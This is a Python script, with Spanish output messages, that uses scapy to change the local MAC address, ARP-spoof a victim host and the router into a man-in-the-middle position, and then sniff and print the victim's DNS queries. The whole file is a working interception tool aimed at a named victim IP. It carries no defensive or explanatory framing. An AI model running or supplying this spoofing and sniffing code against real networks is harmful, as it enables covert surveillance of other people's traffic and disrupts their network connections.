#!/usr/bin/env python3 

import argparse
import subprocess
import threading
import signal
import time
import sys
from termcolor import colored
import scapy.all as scapy

def get_arguments():
    parser = argparse.ArgumentParser(description='Domian Sniffer with ARP')
    parser.add_argument("-i", "--interface", dest="interface", required=True, help="Network Interface to use (Ex: -ens33)")
    parser.add_argument("-t", "--target", dest="target", required=True, help="IP of victim to Spoof (Ex: -192.168.18.44)")
    parser.add_argument("-r", "--router", dest="router", required=True, help="IP of the router (Ex:192.168.18.1)")

    options = parser.parse_args()

    return options.interface, options.target, options.router

stop_event = threading.Event()
def def_handler(sig, frame):
    print(colored(f"\n\tSaliendo......", 'red'))
    stop_event.set()
    sys.exit(0) 

def mac_changer(interface):
    subprocess.run(["ifconfig", interface, "down"])
    subprocess.run(["ifconfig", interface, "hw", "ether", "aa:bb:cc:44:55:66"])
    subprocess.run(["ifconfig", interface, "up"])
    time.sleep(2)

def spoof(ip_spoof, ip_address):
    while True :
        arp_packet = scapy.ARP(op=2, psrc =ip_spoof, pdst=ip_address, hwsrc="aa:bb:cc:44:55:66")
        scapy.send(arp_packet, verbose=False)
        time.sleep(10)

        if stop_event.is_set() :
            break

def process_dns_packet(packet):
    if packet.haslayer(scapy.DNSQR):
        domain = packet[scapy.DNSQR].qname.decode()
    else:
        pass

    black_list = ["google", "bing", "stactic", "cloud"]

    if domain not in domains_seen and  not any(keyword in domain for keyword in black_list):
        domains_seen.add(domain)
        print(colored(f"\t[*]Domino : {domain}", 'green'))
        #pdb.set_trace()

    else:
        pass

def main():
    signal.signal(signal.SIGINT, def_handler)
    global domains_seen
    domains_seen = set()
    interface, ip_target, router = get_arguments()
    thread1 = threading.Thread(target=spoof, args=(ip_target, router))
    thread2 = threading.Thread(target=spoof, args=(router, ip_target)) 
    sniff = scapy.AsyncSniffer(iface=interface, filter="udp and port 53", prn=process_dns_packet, store=0)
    print(colored(f"\n[+] Interceptando packetes de la victima: ", 'grey'))

    try:
        thread1.start()
        thread2.start()
        sniff.start()
    except:
        thread1.join()
        thread2.join()
        sniff.stop()
    finally:
        thread1.join()
        thread2.join()
        sniff.stop()


if __name__ =='__main__':
    main()
